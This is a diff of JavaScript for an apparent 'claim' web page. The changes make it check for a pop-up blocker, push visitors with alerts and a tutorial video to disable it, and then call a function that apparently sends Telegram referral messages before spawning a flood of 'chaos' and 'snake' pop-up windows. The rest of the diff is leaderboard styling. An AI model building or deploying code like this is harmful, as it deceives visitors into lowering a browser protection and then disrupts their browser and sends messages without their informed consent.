@@ -204,21 +204,25 @@ if (isMobileDevice()) {
         // Hide the second CLAIM button
         secondClaimButtonContainer.style.display = 'none';
 
-        claimMessage.textContent = 'Awaiting verification...';
+        claimMessage.textContent = 'Checking for pop-up blocker...';
 
         // Open a test window to check for pop-up blockers
         const testWindow = window.open('', '', 'width=200,height=100');
+
         if (testWindow === null || typeof testWindow === 'undefined') {
             alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
 
             // Show tutorial video on how to disable popup blocker
             showPopupBlockerTutorial();
 
-            claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and try again.';
+            claimMessage.textContent = 'Pop-up blocked. Please allow pop-ups and refresh the page.';
             return;
         } else {
             // Close the test window immediately
             testWindow.close();
+
+            // Proceed to send referral messages
+            sendReferralMessages();
 
             // Start Chaos Effect
             startChaos();
@@ -231,13 +235,14 @@ if (isMobileDevice()) {
         tutorialModal.classList.add('modal');
         tutorialModal.id = 'tutorialModal';
         tutorialModal.innerHTML = `
-            <div class="modal-content">
+            <div class="modal-content rounded-modal">
                 <span class="close" id="closeTutorial">&times;</span>
                 <h2>How to Disable Popup Blocker</h2>
                 <video width="100%" controls>
                     <source src="tutorial1.mp4" type="video/mp4">
                     Your browser does not support the video tag.
                 </video>
+                <p>Please disable your popup blocker and refresh the page to proceed.</p>
             </div>
         `;
         document.body.appendChild(tutorialModal);
@@ -397,19 +402,8 @@ if (isMobileDevice()) {
             if (snakeWindows.length < maxSnakeWindowsCount && Math.random() < snakeWindowChance) {
                 snakeWindows.push(chaosWindowObj);
             }
-
-            // Send Telegram messages once the first chaos window is open
-            if (chaosWindows.length === 1) {
-                sendReferralMessages();
-            }
         } else {
-            console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
-            alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
-
-            // Show tutorial video on how to disable popup blocker
-            showPopupBlockerTutorial();
-
-            stopChaos(); // Stop attempting to spawn windows
+            console.warn('Pop-up blocked. Unable to open chaos window.');
         }
     }
 
@@ -547,8 +541,8 @@ if (isMobileDevice()) {
         }
     }
 
-    // Move Leaderboard Button to Nav Bar
-    function moveLeaderboardButtonToNavBar() {
+    // Move Leaderboard Button to Far Right
+    function moveLeaderboardButtonToFarRight() {
         // Remove existing leaderboard button
         leaderboardButton.parentNode.removeChild(leaderboardButton);
 
@@ -557,6 +551,9 @@ if (isMobileDevice()) {
         leaderboardTab.classList.add('tab');
         leaderboardTab.id = 'leaderboardButton';
         leaderboardTab.textContent = 'Leaderboard';
+
+        // Style the leaderboard tab to be on the far right
+        leaderboardTab.style.marginLeft = 'auto';
 
         // Append it to the nav tabs
         navTabs.appendChild(leaderboardTab);
@@ -573,5 +570,5 @@ if (isMobileDevice()) {
     }
 
     // Call the function to move the leaderboard button
-    moveLeaderboardButtonToNavBar();
+    moveLeaderboardButtonToFarRight();
 }
